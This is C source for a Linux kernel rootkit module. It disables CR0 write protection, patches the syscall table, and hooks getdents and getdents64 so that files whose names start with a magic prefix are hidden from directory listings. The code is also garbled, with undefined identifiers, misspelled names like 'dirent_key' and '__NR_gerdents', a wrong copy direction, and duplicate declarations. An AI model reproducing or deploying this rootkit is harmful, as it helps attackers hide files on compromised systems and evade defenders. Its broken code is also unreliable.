#include<linux/module.h>
#include "libs/ftrace_helper.h"

#define MAGIC "dcg"

unsigned long *__sysc_table;
typedef asmlinkage (*t_syscall)(const struct pt_regs *);
static t_syscall orig_getdents64;
static t_syscall orig_getdents;

unsigned long *ret_sysc_table(void)
{
  __sysc_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
  return __sysc_table;
}

static asmlinkage long (*orig_getdents64)(const struct pt_regs *);
asmlinkage int hook_getdents64(const struct pt_regs *regs)
{
  int fd = (int)pt_regs->di;
  struct linux_dirent64 __user *dirent = (struct linux_dirent *)pt_regs->si;
  struct linux_dirent64 *current_dir, *dirent_ker, *previous_dir = NULL;

  unsigned long offset = 0;

  int ret = orig_getdents64(pt_regs);
  dirent_ker = kzalloc(ret, GFP_KERNEL);

  if( (ret <= 0) || (dirent_ker == NULL))
  	return ret;

  long err = copy_from_user(dirent_key, dirent, ret);
  if (err)
  	goto done;

  while (offset < ret)
  {
  	current_dir = (void *)dirent_ker + offset;

  	if (memcmp(MAGIC, current_dir->d_name, strlen(MAGIC)) == 0)
  	{
  	  if (current_dir == dirent_ker)
      {
  	    ret -= current_dir->d_reclen;
  	    memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
  	    continue;
  	  }

  	  previous_dir->d_reclen += current_dir->d_reclen;
  	}

  	else
  	{
  		previous_dir = current_dir;
  	}

  	offset += current_dir->d_reclen;
  }

  error = copy_from_user(dirent, dirent_key, ret);
  if (error)
  	goto done;

done:
  kfree(dirent_ker);
  return ret;

}

static asmlinkage long (*orig_getdents)(const struct pt_regs *regs)
asmlinkage int hook_getdents(const struct pt_regs *regs)
{
    struct linux_dirent {
        unsigned long d_ino;
        unsigned long d_off;
        unsigned short d_reclen;
        char d_name[];
    };

    int fd = regs->di;
    struct linux_dirent *dirent = (struct linux_dirent *)regs->si;
    

    long error;

    struct linux_dirent *current_dir, *dirent_ker, *previous_dir = NULL;
    
    unsigned long offset = 0;

    int ret = orig_getdents(regs);
    dirent_ker = kzalloc(ret, GFP_KERNEL);

    if ( (ret <= 0) || (dirent_ker == NULL) )
        return ret;

    error = copy_from_user(dirent_ker, dirent, ret);
    if (error)
        goto done;

    while (offset < ret)
    {
        current_dir = (void *)dirent_ker + offset;

        if ( memcmp(PREFIX, current_dir->d_name, strlen(PREFIX)) == 0)
        {
            if ( current_dir == dirent_ker )
            {
                ret -= current_dir->d_reclen;
                memmove(current_dir, (void *)current_dir + current_dir->d_reclen, ret);
                continue;
            }

            previous_dir->d_reclen += current_dir->d_reclen;
        }
        else
        {
            previous_dir = current_dir;
        }

        offset += current_dir->d_reclen;
    }

    error = copy_to_user(dirent, dirent_ker, ret);
    if (error)
        goto done;

done:
  kfree(dirent_ker);
  return ret;

}

unsigned long cr0;

static inline void def_cr0(unsigned long val)
{
	unsigned long __force_order;
	asm volatile(
			"mov %0, %%cr0"
			: "+r"(val), "+m"(__force_order));
}

static int __init rootkit_init(void)
{
  def_cr0(cr0 & ~0x00010000);

  unsigned long *__sysc = ret_sysc_table();
  
  orig_getdents64 = (t_syscall)__sysc[__NR_getdents64];
  orig_getdents = (t_syscall)__sysc[__NR_getdents];

  __sysc[__NR_getdents64] = (unsigned long)hook_getdents64;
  __sysc[__NR_gerdents] = (unsigned long)hook_getdents;
	
  def_cr0(cr0);

  return 0;
}

static void __exit rootkit_destroy(void)
{
  def_cr0(cr0 & ~0x00010000);

  __sysc[__NR_getdents64] = (unsigned long)orig_getdents64;
  __sysc[__NR_getdents] = (unsigned long)orig_getdents;

  def_cr0(cr0);
}

module_init(rootkit_init);
module_exit(rootkit_destroy);
